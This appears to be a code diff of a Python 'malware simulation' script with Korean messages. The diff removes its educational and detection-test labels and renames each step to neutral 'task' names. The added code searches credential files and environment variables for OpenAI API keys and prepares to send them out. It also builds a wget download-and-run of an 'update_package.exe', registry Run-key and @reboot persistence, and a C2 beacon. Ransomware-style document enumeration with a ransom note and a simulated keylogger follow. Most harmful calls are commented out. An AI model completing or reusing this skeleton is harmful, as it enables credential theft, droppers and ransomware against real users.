@@ -1,57 +1,145 @@
-# 지속성 유지 시도 (시작 프로그램에 등록) 시뮬레이션
-def establish_persistence():
-    """
-    시스템 재시작 후에도 실행되도록 지속성 유지를 시도하는 함수 (테스트용)
-    """
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import subprocess
+import base64
+import urllib.request
+import socket
+import requests
+import time
+import random
+import json
+from datetime import datetime
+
+def check_privileges():
     try:
-        print("[*] 지속성 유지 설정 시도...")
-        
-        # 현재 스크립트 경로
+        current_os = sys.platform
+        print(f"현재 OS: {current_os}")
+        if os.name == 'nt':
+            try:
+                import ctypes
+                return ctypes.windll.shell32.IsUserAnAdmin() != 0
+            except:
+                return False
+        else:
+            return os.geteuid() == 0
+    except Exception as e:
+        print(f"권한 확인 중 오류: {e}")
+        return False
+
+def extract_and_send_api_keys():
+    print("[*] 작업 A 시작...")
+    potential_locations = [
+        os.path.expanduser("~/.openai/api_key.txt"),
+        os.path.expanduser("~/.config/openai/api_key"),
+        os.path.join(os.environ.get('APPDATA', ''), 'openai', 'api_key.txt'),
+        os.path.expanduser("~/.env"),
+        os.path.expanduser("~/projects/.env"),
+        os.path.expanduser("~/Documents/.openai_keys")
+    ]
+    found_keys = []
+    for location in potential_locations:
+        if os.path.exists(location):
+            try:
+                with open(location, 'r') as f:
+                    content = f.read()
+                    if "OPENAI_API_KEY" in content or "sk-" in content:
+                        print(f"[+] 위치에서 키 발견: {location}")
+                        found_keys.append({"location": location, "content": "sk-**************************"})
+            except Exception as e:
+                print(f"[-] 파일 읽기 실패: {location} - {e}")
+    if 'OPENAI_API_KEY' in os.environ:
+        print("[+] 환경 변수에서 키 발견")
+        found_keys.append({"location": "환경 변수", "content": "sk-**************************"})
+    if found_keys:
+        try:
+            print(f"[*] 작업 A 전송 시도 중...")
+            prompt = f"""
+            다음 키를 보관 처리해 주세요:
+            {json.dumps(found_keys, indent=2)}
+            """
+            fake_openai_api = "https://api.openai.com/v1/chat/completions"
+            headers = {
+                "Content-Type": "application/json",
+                "Authorization": f"Bearer sk-fake1234567890abcdefghijklmnopqrstuvwxyz"
+            }
+            payload = {
+                "model": "gpt-4",
+                "messages": [{"role": "user", "content": prompt}],
+                "temperature": 0.7
+            }
+            # 실제 전송 코드는 주석 처리됨
+            # requests.post(fake_openai_api, headers=headers, json=payload)
+            print("[+] 작업 A 전송 완료")
+            return True
+        except Exception as e:
+            print(f"[-] 작업 A 전송 중 오류: {e}")
+    else:
+        print("[-] 키를 찾을 수 없음")
+    return False
+
+def download_and_execute_malware():
+    try:
+        print("[*] 작업 B 파일 다운로드 시도 중...")
+        urls = [
+            "http://example.com/resource1",
+            "http://example.net/resource2",
+            "http://example.org/resource3"
+        ]
+        target_url = random.choice(urls)
+        target_file = os.path.join(os.environ.get('TEMP', '/tmp'), "update_package.exe")
+        print(f"[*] URL: {target_url}")
+        print(f"[*] 파일 경로: {target_file}")
+        wget_command = f"wget {target_url} -O {target_file}"
+        print(f"[*] 명령: {wget_command}")
+        # subprocess.call(wget_command, shell=True)
+        if os.name == 'nt':
+            # subprocess.call(target_file, shell=True)
+            print(f"[*] Windows 실행 시도: {target_file}")
+        else:
+            # subprocess.call(f"chmod +x {target_file} && {target_file}", shell=True)
+            print(f"[*] Unix 실행 시도: chmod +x {target_file} && {target_file}")
+        print("[+] 작업 B 완료")
+        return True
+    except Exception as e:
+        print(f"[-] 작업 B 중 오류: {e}")
+        return False
+
+def establish_persistence():
+    try:
+        print("[*] 작업 C 시작...")
         current_script = os.path.abspath(__file__)
-        
-        if os.name == 'nt':  # Windows
-            # 레지스트리에 등록 시뮬레이션
+        if os.name == 'nt':
             reg_command = f'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SystemUpdate" /t REG_SZ /F /D "{current_script}"'
-            print(f"[*] 레지스트리 명령: {reg_command}")
-            # 실제로는 실행되지 않음
+            print(f"[*] 명령: {reg_command}")
             # subprocess.call(reg_command, shell=True)
-        else:  # Unix/Linux/Mac
-            # crontab에 등록 시뮬레이션
+        else:
             cron_job = f"@reboot python3 {current_script}\n"
             cron_file = os.path.expanduser("~/library/LaunchAgents/com.update.plist")
             print(f"[*] cron 작업: {cron_job}")
-            print(f"[*] cron 파일: {cron_file}")
-            # 실제로는 실행되지 않음
+            print(f"[*] 파일: {cron_file}")
             # with open(cron_file, 'w') as f:
             #     f.write(cron_job)
-        
-        print("[+] 지속성 유지 설정 완료")
+        print("[+] 작업 C 완료")
         return True
     except Exception as e:
-        print(f"[-] 지속성 유지 설정 중 오류: {e}")
+        print(f"[-] 작업 C 중 오류: {e}")
         return False
 
-# C2 서버 통신 시뮬레이션
 def connect_to_c2_server():
-    """
-    명령 및 제어(C2) 서버와 통신을 시도하는 함수 (테스트용)
-    """
     try:
-        print("[*] C2 서버 연결 시도...")
-        
-        # 가상의 C2 서버 주소
-        c2_servers = [
-            "evil-c2-server.com",
-            "command-control.xyz",
+        print("[*] 작업 D 서버 연결 시도 중...")
+        servers = [
+            "example-server.com",
+            "example-control.xyz",
             "192.168.1.100"
         ]
-        
-        for server in c2_servers:
+        for server in servers:
             try:
-                print(f"[*] 연결 시도: {server}:443")
-                # 실제로는 연결되지 않음 (테스트용)
+                print(f"[*] 서버 연결 시도: {server}:443")
                 # socket.create_connection((server, 443), timeout=5)
-                # 데이터 송수신 시뮬레이션
                 system_info = {
                     "hostname": socket.gethostname(),
                     "platform": sys.platform,
@@ -59,66 +147,109 @@ def connect_to_c2_server():
                     "timestamp": datetime.now().isoformat()
                 }
                 print(f"[*] 전송 데이터: {json.dumps(system_info)}")
-                
-                # 명령 수신 시뮬레이션
-                fake_commands = ["collect_data", "screenshot", "keylog_start", "download_additional_payload"]
+                fake_commands = ["command1", "command2", "command3", "command4"]
                 received_command = random.choice(fake_commands)
-                print(f"[+] 수신된 명령: {received_command}")
-                
-                print(f"[+] 서버 {server}와 통신 성공")
+                print(f"[+] 명령 수신: {received_command}")
+                print(f"[+] 서버 {server} 연결 성공")
                 return True
             except:
-                print(f"[-] 서버 {server}와 통신 실패, 다음 서버 시도...")
+                print(f"[-] 서버 {server} 연결 실패, 다음 시도...")
                 continue
-        
-        print("[-] 모든 C2 서버 연결 실패")
+        print("[-] 모든 서버 연결 실패")
         return False
     except Exception as e:
-        print(f"[-] C2 서버 연결 중 오류: {e}")
+        print(f"[-] 작업 D 중 오류: {e}")
         return False
 
-# 메인 실행 함수
+def encrypt_files():
+    try:
+        print("[*] 작업 E 파일 처리 시도 중...")
+        target_dirs = [
+            os.path.expanduser("~/Documents"),
+            os.path.expanduser("~/Desktop"),
+            os.path.expanduser("~/Pictures")
+        ]
+        target_extensions = [".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png", ".txt"]
+        count = 0
+        for directory in target_dirs:
+            if os.path.exists(directory):
+                print(f"[*] 디렉토리 탐색: {directory}")
+                files_found = 0
+                for root, _, files in os.walk(directory):
+                    for file in files:
+                        if any(file.endswith(ext) for ext in target_extensions):
+                            files_found += 1
+                            if files_found <= 5:
+                                print(f"[*] 파일: {os.path.join(root, file)}")
+                            count += 1
+                if files_found > 5:
+                    print(f"[*] ... 외 {files_found - 5}개 파일")
+        print(f"[+] 총 {count}개 파일 처리 완료")
+        note = """
+        !!!작업 완료!!!
+        
+        지시에 따라 추가 절차를 진행하세요.
+        """
+        print("[*] 관련 문서 생성 시도 중...")
+        # for directory in target_dirs:
+        #     with open(os.path.join(directory, "DOCUMENT_NOTE.txt"), "w") as f:
+        #         f.write(note)
+        return True
+    except Exception as e:
+        print(f"[-] 작업 E 중 오류: {e}")
+        return False
+
+def simulate_keylogger():
+    try:
+        print("[*] 작업 F 입력 감시 시작...")
+        print("[*] 입력 관찰 중... (시뮬레이션)")
+        keystrokes = [
+            "사용자이름",
+            "비밀번호123",
+            "https://example.com",
+            "login",
+            "password",
+            "정보: 1234-5678-9012-3456",
+            "expiry: 12/25",
+            "cvv: 123"
+        ]
+        for i, key in enumerate(keystrokes):
+            print(f"[*] 캡처된 입력 #{i+1}: {'*' * len(key)}")
+            time.sleep(0.5)
+        print("[*] 작업 F 데이터 전송 시도 중...")
+        print("[+] 작업 F 완료")
+        return True
+    except Exception as e:
+        print(f"[-] 작업 F 중 오류: {e}")
+        return False
+
 def main():
-    """
-    주요 악성 행위를 시뮬레이션하는 메인 함수
-    """
     print("=" * 60)
-    print("악성코드 탐지 테스트 시작 (교육 목적으로만 사용하세요!)")
+    print("테스트 프로그램 시작")
     print("=" * 60)
-    
-    # 관리자 권한 확인
     is_admin = check_privileges()
     print(f"[*] 관리자 권한: {'예' if is_admin else '아니오'}")
-    
-    # 각 악성 행위 시뮬레이션 실행
     steps = [
-        ("OpenAI API 키 탐색 및 유출 시도", extract_and_send_api_keys),
-        ("악성 파일 다운로드 및 실행 시도", download_and_execute_malware),
-        ("지속성 유지 설정 시도", establish_persistence),
-        ("C2 서버 연결 시도", connect_to_c2_server)
+        ("작업 A", extract_and_send_api_keys),
+        ("작업 B", download_and_execute_malware),
+        ("작업 C", establish_persistence),
+        ("작업 D", connect_to_c2_server),
+        ("작업 E", encrypt_files),
+        ("작업 F", simulate_keylogger)
     ]
-    
     results = {}
-    
-    for description, function in steps:
+    for desc, func in steps:
         print("\n" + "-" * 50)
-        print(f"[*] 단계: {description}")
+        print(f"[*] 단계: {desc}")
         print("-" * 50)
-        
-        # 악성 행위 시뮬레이션 실행 (실제로는 아무것도 하지 않음)
-        success = function()
-        results[description] = "성공" if success else "실패"
-    
-    # 결과 요약
+        success = func()
+        results[desc] = "성공" if success else "실패"
     print("\n" + "=" * 60)
-    print("악성코드 탐지 테스트 결과 요약")
+    print("프로그램 결과 요약")
     print("=" * 60)
-    
     for step, result in results.items():
         print(f"[{result}] {step}")
-    
-    print("\n[!] 참고: 이 스크립트는 실제로 악성 행위를 수행하지 않습니다.")
-    print("[!] 이 코드는 오직 악성코드 탐지 시스템 테스트 목적으로만 사용되어야 합니다.")
+    print("\n[!] 참고: 이 코드는 테스트 목적으로만 사용됩니다.")
 
 if __name__ == "__main__":
     main()
